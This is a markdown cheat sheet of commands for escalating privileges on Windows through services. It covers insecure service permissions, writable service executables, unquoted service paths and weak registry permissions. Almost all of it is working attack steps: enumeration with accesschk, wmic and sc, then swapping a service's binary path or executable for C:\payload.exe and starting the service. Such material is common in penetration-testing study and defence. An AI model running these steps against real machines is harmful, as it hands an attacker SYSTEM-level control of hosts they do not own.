# Service - Privilege Escalation

## Insecure Service Permissions

Check service permissions:

```powershell
accesschk.exe /accepteula -uwcqv USERNAME SERVICE_NAME
accesschk.exe /accepteula -uwcqv USERNAME *
```

Get service details

```powershell
sc qc SERVICE_NAME
```

Modify the service config and set the BINARY_PATH_NAME

```powershell
sc config SERVICE_NAME binpath= "\"C:\payload.exe\""
```

Run the payload

```powershell
net start SERVICE_NAME
```

## Insecure Service Executables

Check service with weak file permission

```powershell
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\Service\Servicenames.exe"
```

```powershell
wmic.exe  
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
```

sc.exe

```powershell
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  
type Servicenames.txt  
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
```

Overwrite service binary with the payload

```powershell
copy C:\payload.exe "C:\Program Files\Servicenames.exe" /y
```

Run the payload

```powershell
net start SERVICE_NAME
```

## Unquoted Service Path  

Find vulnerable service:

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\windows\\" |findstr /i /v """  
```

### Example

Service path

```powershell
"C:\Program Files\Unquoted Path Service\service.exe"
```

Test permission

```powershell
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"

or 

icacls "C:\Program Files\Unquoted Path Service"
```

Payload

```powershell
copy C:\payload.exe "C:\Program Files\Unquoted\Unquoted.exe"
```

Run payload

```powershell
net start SERVICE_NAME
```

## Weak Registry Permissions

List all service permission service:

```powershell
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\
```

Find vulnerable service:

```powershell
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICE_NAME
```powershell

If permission are:

```text
RW NT AUTHORITY\INTERACTIVE
    KEY_ALL_ACCESS
```

Overwrite the ImagePath registry key:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICE_NAME /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f

or 

sc config SERVICE_NAME binPath= "C:\payload.exe"
```
